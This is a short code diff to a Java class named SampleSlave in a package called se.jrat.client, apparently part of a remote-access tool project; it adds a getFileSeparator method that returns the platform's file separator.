@@ -1,5 +1,7 @@
 package se.jrat.client;
 
+import java.io.File;
+
 import com.redpois0n.oslib.AbstractOperatingSystem;
 
 public class SampleSlave extends AbstractSlave {
@@ -22,6 +24,11 @@ public class SampleSlave extends AbstractSlave {
 	@Override
 	public void ping() throws Exception {
 		
+	}
+
+	@Override
+	public String getFileSeparator() {
+		return File.separator;
 	}
 
 }
